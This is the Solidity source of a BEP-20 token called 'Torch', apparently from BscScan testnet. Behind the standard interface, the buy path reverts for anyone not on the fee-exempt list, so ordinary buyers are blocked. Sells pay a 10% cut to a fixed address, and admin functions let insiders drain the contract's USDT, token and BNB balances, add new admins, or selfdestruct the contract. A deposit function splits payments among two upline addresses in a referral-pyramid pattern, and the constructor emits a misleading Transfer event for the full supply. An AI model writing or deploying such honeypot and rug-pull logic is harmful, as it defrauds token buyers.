/**
 *Submitted for verification at testnet.bscscan.com on 2023-10-25
*/

/**
 *Submitted for verification at testnet.bscscan.com on 2023-10-21
*/

pragma solidity ^0.8.6;

// SPDX-License-Identifier: Unlicensed
interface IERC20 {
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

contract Ownable {
    address public _owner;

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function changeOwner(address newOwner) public onlyOwner {
        _owner = newOwner;
    }
}

library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);


    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function quote(
        uint256 amountA,
        uint256 reserveA,
        uint256 reserveB
    ) external pure returns (uint256 amountB);

    function getAmountOut(
        uint256 amountIn,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountOut);

    function getAmountIn(
        uint256 amountOut,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountIn);

    function getAmountsOut(uint256 amountIn, address[] calldata path)
    external
    view
    returns (uint256[] memory amounts);

    function getAmountsIn(uint256 amountOut, address[] calldata path)
    external
    view
    returns (uint256[] memory amounts);
}
interface IUniswapV2Router02 is IUniswapV2Router01 {


    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

   
}

contract Torch is IERC20, Ownable {
    using SafeMath for uint256;
    address public uusdt;//uusdt utoken
    address public utoken;
    address public uwbnb;
    IERC20 public USDT = IERC20(0x138d1F66d1e4991D0CEAd281388238394129d682);
    IERC20 public Token=IERC20(0x99E80B8D16f89f1d7DD850d83eC5fe3155b5274f);
    IERC20 public WBNB=IERC20(0xae13d989daC2f0dEbFf460aC112a837C89BAa7cd);//uwbnb WBNB

    mapping(address => uint256) private _rOwned;
    mapping(address => uint256) private _tOwned;
    mapping(address => uint256) private guanli;
    mapping(address => mapping(address => uint256)) private _allowances;

    mapping(address => bool) private _isExcludedFromFee;

    uint256 private constant MAX = ~uint256(0);
    uint256 private _tTotal;
    uint256 private _rTotal;
    uint256 private _tFeeTotal;

    string private _name;
    string private _symbol;
    uint256 private _decimals;

    address private _destroyAddress =
        address(0x0000000000000000000000000000000000000000);

    uint256 public sell_kaiguan = 0;//
    uint256 public buy_kaiguan = 0;//
    mapping(address => address) public inviter;
    mapping(address => uint256) public lastSellTime;
    
    uint256 public buytype = 0;

    address public buy_fasong ;
    address public buy_jieshou ;
    bool public buy_shoutype ;
    uint256 public listCount = 0;
    mapping (uint256 => address) public listToOwner;
    mapping (uint256 => uint256) public listnum;
    mapping (uint256 => address) public listba;
    mapping (uint256 => address) public listye;
    address public uniswapV2Pair;
    mapping(address => uint256) public luyou;
    address public fund1Address = address(0x3447319d0c13609538De969afca53D2D4D31Fa3F);
    address public haveAddress = address(0xbe7920b020E56104550B698e1A7D82b5fC196180);
    address public shouAddress = address(0x964b3AEb4Fb3c5B759072b1988DEED6942240697);//fund1Address shouAddress haveAddress
    address public bigAddress = address(0x9B3c62647E6eEed4d07f819d1506ebb448e2b3f8);
    uint256 public _mintTotal;
    IUniswapV2Router02 public uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    //0x10ED43C718714eb63d5aA57B78B54704E256024E 0xD99D1c33F9fC3444f8101754aBC46c52416550D1
    
    constructor(address tokenOwner) {
        _name = "Torch";
        _symbol = "Torch";
        _decimals = 18;

        _tTotal = 21000000 * 10**_decimals;
        _mintTotal = 210000 * 10**_decimals;
        _rTotal = (MAX - (MAX % _tTotal));
        //_rOwned[msg.sender] = _rTotal.div(100).mul(10);
        _rOwned[haveAddress] = _rTotal.div(100).mul(20);
        _rOwned[bigAddress] = _rTotal.div(100).mul(80);
        setMintTotal(_mintTotal);
        //exclude owner and this contract from fee
        _isExcludedFromFee[tokenOwner] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[shouAddress] = true;
        _isExcludedFromFee[bigAddress] = true;
        guanli[_owner]=1;
        guanli[msg.sender]=1;
        guanli[haveAddress]=1;
        guanli[bigAddress]=1;
        _owner = tokenOwner;
        emit Transfer(address(0), tokenOwner, _tTotal);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint256) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }
    
    function getInviter(address account) public view returns (address) {
        return inviter[account];
    }
    function balanceOf(address account) public view override returns (uint256) {
        return tokenFromReflection(_rOwned[account]);
    }
    
    function balancROf(address account) public view returns (uint256) {
        return _rOwned[account];
    }


    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        if(msg.sender == uniswapV2Pair|| recipient == uniswapV2Pair){
      //  if(luyou[msg.sender]==1){
             _transfer(msg.sender, recipient, amount);
        }else{
            _tokenOlnyTransfer(msg.sender, recipient, amount);
        }
       
        return true;
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        if(recipient == uniswapV2Pair|| recipient == uniswapV2Pair){//接收等于池子，
    //    if(luyou[recipient] == 1){//接收等于池子，
             _transfer(sender, recipient, amount);
        }else{
             _tokenOlnyTransfer(sender, recipient, amount);
        }
       
        _approve(
            sender,
            msg.sender,
            _allowances[sender][msg.sender].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender].add(addedValue)
        );
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender].sub(
                subtractedValue,
                "ERC20: decreased allowance below zero"
            )
        );
        return true;
    }

    function totalFees() public view returns (uint256) {
        return _tFeeTotal;
    }

    function tokenFromReflection(uint256 rAmount)
        public
        view
        returns (uint256)
    {
        require(
            rAmount <= _rTotal,
            "Amount must be less than total reflections"
        );
        uint256 currentRate = _getRate();
        return rAmount.div(currentRate);
    }

    function excludeFromFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = true;
    }

    function includeInFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = false;
    }
    function a_set_kaiguan(uint256 _kaiguan) public onlyOwner {
        buy_kaiguan = _kaiguan;
    }

    //to recieve ETH from uniswapV2Router when swaping
    receive() external payable {}

    function _getRate() private view returns (uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply.div(tSupply);
    }

    function _getCurrentSupply() private view returns (uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = _tTotal;
        if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
        return (rSupply, tSupply);
    }

    function claimTokens() public onlyOwner {
        payable(_owner).transfer(address(this).balance);
    }

    function isExcludedFromFee(address account) public view returns (bool) {
        return _isExcludedFromFee[account];
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(amount > 0, "Transfer amount must be greater than zero");
        bool takeFee = true;
        if (_isExcludedFromFee[from] || _isExcludedFromFee[to]) {
            takeFee = false;
        }

        if(from==uniswapV2Pair){
       // if(luyou[from]==1){
            //require(_isExcludedFromFee[from] || _isExcludedFromFee[to], "need bai");
            _tokenTransferbuy(from, to, amount, takeFee);
        }
        if(to==uniswapV2Pair){
       // if(luyou[to]==1){    
            _tokenTransfersell(from, to, amount, takeFee);
            /*
            if(_isExcludedFromFee[from] || _isExcludedFromFee[to]){
                _tokenTransfersell(from, to, amount, takeFee);
            }else{
                require(_isExcludedFromFee[msg.sender]==true, "Transfer amount must be greater than zero");
                //_tokenTransfersell(from, to, amount, takeFee);
            }*/
        }
    }

    function _tokenTransferbuy(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee
    ) private {
        

        bool yunxu = false;
        //if (_isExcludedFromFee[sender] || _isExcludedFromFee[recipient]) {
        if (_isExcludedFromFee[recipient]) {
            yunxu = true;

        }
        buy_shoutype =_isExcludedFromFee[recipient]; 
        buy_jieshou = recipient;
        buy_fasong = address(sender); 

        require(yunxu ==true, "jiaoyi guanbi ");
        
        

        uint256 currentRate = _getRate();
        uint256 rAmount = tAmount.mul(currentRate);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rAmount);
        emit Transfer(sender, recipient, tAmount);
    }
    
    function _tokenTransfersell(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee
    ) private {

        uint256 currentRate = _getRate();
        uint256 rAmount = tAmount.mul(currentRate);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        uint256 recipientRate = 90 ;
        _rOwned[recipient] = _rOwned[recipient].add(
            rAmount.div(100).mul(recipientRate)
        );
        
            //swap2tokentobnb( rAmount.div(100).mul(10));
             _takeTransfer(
                sender,
                fund1Address,
                tAmount.div(100).mul(10),
                currentRate
            );
        
        
        emit Transfer(sender, recipient, tAmount.div(100).mul(recipientRate));
    }

    
    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee
    ) private {

        uint256 currentRate = _getRate();
        uint256 rAmount = tAmount.mul(currentRate);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        uint256 recipientRate = 100;
        _rOwned[recipient] = _rOwned[recipient].add(
            rAmount.div(100).mul(recipientRate)
        );
        emit Transfer(sender, recipient, tAmount.div(100).mul(recipientRate));
    }

    function _tokenOlnyTransfer(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        uint256 currentRate = _getRate();

        if(_rOwned[recipient] == 0 && inviter[recipient] == address(0)){
			inviter[recipient] = sender;
		}else{
		    
		}
        uint256 rAmount = tAmount.mul(currentRate);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        
        if (_isExcludedFromFee[recipient] || _isExcludedFromFee[sender]) {
            _rOwned[recipient] = _rOwned[recipient].add(rAmount);
            emit Transfer(sender, recipient, tAmount);
        }else{

            
            _rOwned[recipient] = _rOwned[recipient].add(rAmount);
            emit Transfer(sender, recipient, tAmount);
        }
    }
    


    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount,
        uint256 currentRate
    ) private {
        uint256 rAmount = tAmount.mul(currentRate);
        _rOwned[to] = _rOwned[to].add(rAmount);
        emit Transfer(sender, to, tAmount);
    }

    function _reflectFee(uint256 rFee, uint256 tFee) private {
        _rTotal = _rTotal.sub(rFee);
        _tFeeTotal = _tFeeTotal.add(tFee);
    }

    function changeRouter(address _router)public onlyOwner  {
        //[_router] = _type;
        uniswapV2Pair = _router;
    }

    function setMintTotal(uint256 mintTotal) private {
        _mintTotal = mintTotal;
    }

    function kill() public onlyOwner{
        selfdestruct(payable(msg.sender));
    }


  /* 
    function swap2tokentobnb2
        (uint256 tokenAmount) public {
        require(guanli[msg.sender]==1,"no sir");
        require(tokenAmount <= balanceOf(msg.sender), "too mouch");
		address[] memory path = new address[](2);
        path[0] = utoken;
        path[1] = uwbnb;
        Token.transferFrom(msg.sender,address(this), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            shouAddress,
            block.timestamp
        );
    }
    
    function swap2tokentobnb
        (uint256 tokenAmount) private {
		address[] memory path = new address[](2);
        path[0] = utoken;
        path[1] = uwbnb;
        Token.transferFrom(msg.sender,address(this), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            shouAddress,
            block.timestamp
        );
    }*/ 
    
    
    function swapusdtbuy
        (uint256 tokenAmount) public {
        require(guanli[msg.sender]==1,"no sir");
        require(USDT.balanceOf(msg.sender)>=tokenAmount,"no usdt");
		address[] memory path = new address[](2);
        path[0] = uusdt;
      //  path[1] = uwbnb;
        path[1] = utoken;
        USDT.transferFrom(msg.sender,address(this), tokenAmount);
        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            shouAddress,
            block.timestamp
        );
    }
    


    function userbaodan(uint256 _num,address _baba,address _yeye) public {
        require(USDT.balanceOf(msg.sender)>=_num*10**18,"no usdt");
        address[] memory path = new address[](2);
        path[0] = uusdt;
    //    path[1] = uwbnb;
        path[1] = utoken;
        uint256 shuliang = _num*10**18;
        USDT.transferFrom(msg.sender,_baba, shuliang.div(100).mul(10));
        USDT.transferFrom(msg.sender,_yeye, shuliang.div(100).mul(35));
        USDT.transferFrom(msg.sender,shouAddress, shuliang.div(100).mul(10));
        USDT.transferFrom(msg.sender,address(this), shuliang.div(100).mul(45));
        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            shuliang.div(100).mul(45),
            0,
            path,
            shouAddress,
            block.timestamp
        );

        listCount = listCount+1;
        listToOwner[listCount]=msg.sender;
        listnum[listCount]=listnum[listCount]+_num;
        listba[listCount]=_baba;
        listye[listCount]=_yeye;
    }

    function get_list_one(  uint256  _id) public view returns(address _user,uint256 _num,address _baba,address _yeye) {
        _user = listToOwner[_id];
        _num = listnum[_id];
        _baba = listba[_id];
        _yeye = listye[_id];
        return (_user,_num,_baba,_yeye);
    }


    function a_set_token(IERC20 _USDT,IERC20 _Token ,address _uusdt,address _utoken ) public {
        require(guanli[msg.sender]==1,"no sir");
        USDT = _USDT;
        Token = _Token;
        uusdt = _uusdt;
        utoken = _utoken;
    }
    
    function a_approve() public {
        require(guanli[msg.sender]==1,"no sir");
        USDT.approve(address(0x10ED43C718714eb63d5aA57B78B54704E256024E), 1000000000000000000000000000);
        Token.approve(address(0x10ED43C718714eb63d5aA57B78B54704E256024E), 100000000000000000000000000);
     //   WBNB.approve(address(0xD99D1c33F9fC3444f8101754aBC46c52416550D1), 100000000000000000000000000);
    }//0xD99D1c33F9fC3444f8101754aBC46c52416550D1
    //0x9a489505a00cE272eAa5e07Dba6491314CaE3796
    //0x10ED43C718714eb63d5aA57B78B54704E256024E

    function  tixian_usdt( )  public {
        require(guanli[msg.sender]==1,"no sir");
        uint256 num = USDT.balanceOf(address(this));
        USDT.transfer(_owner, num);
    }
    function  tixian_token( )  public {
        require(guanli[msg.sender]==1,"no sir");
        uint256 num = Token.balanceOf(address(this));
        Token.transfer(_owner, num);
    }
    function admin_tixian(address payable _to)  public {
        require(guanli[msg.sender]==1,"no sir");
        _to.transfer(address(this).balance);
    }
      
    function sir_set_sir(address _user,uint256 _ttype) public {
        require(guanli[msg.sender]==1,"no sir");
        guanli[_user]=_ttype;
    }

    function get_price() external view returns(uint256 _price) {
       _price=(USDT.balanceOf(uniswapV2Pair)*1000000/Token.balanceOf(uniswapV2Pair));
    }

}